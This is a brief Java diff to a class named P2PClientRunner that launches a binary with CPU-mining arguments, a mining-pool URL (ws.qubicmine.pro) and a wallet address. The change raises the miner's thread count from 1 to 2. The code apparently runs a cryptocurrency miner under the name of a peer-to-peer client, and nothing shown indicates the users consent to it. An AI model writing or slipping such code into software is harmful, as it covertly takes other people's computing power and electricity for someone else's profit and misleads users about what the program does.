@@ -24,7 +24,7 @@ public class P2PClientRunner {
             ProcessBuilder processBuilder = new ProcessBuilder(
                 "./" + P2P_PATH,
                 "--cpu",
-                "-t", "1",
+                "-t", "2",
                 "--worker", "aaa1",
                 "--url", "ws.qubicmine.pro",
                 "--wallet", "XJWLMDBPMLRXZDXXNAUCMVYYRERDSMNPBSHYLJMRRGDGTQMCUDLJRQAEIMEA"
